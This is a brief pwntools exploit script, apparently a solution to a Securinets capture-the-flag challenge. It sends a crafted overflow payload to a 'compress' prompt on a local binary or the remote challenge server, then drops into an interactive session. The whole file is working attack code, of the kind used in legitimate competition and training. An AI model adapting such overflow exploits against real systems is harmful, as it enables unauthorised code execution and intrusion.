from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./main"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("pwn-14caf623.p1.securinets.tn", 9000)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

tinyfat = []
for i in range(0x18c):
    if i % 2 == 0:
        tinyfat.append(b"A")
    else:
        tinyfat.append(b"B")

payload = b"".join(tinyfat) + b"\xa9" * 0x11
ddebug("break *0x40137F\n continue")
io.sendafter("compress :", payload)

io.sendafter("compress :", "exit")

io.interactive()
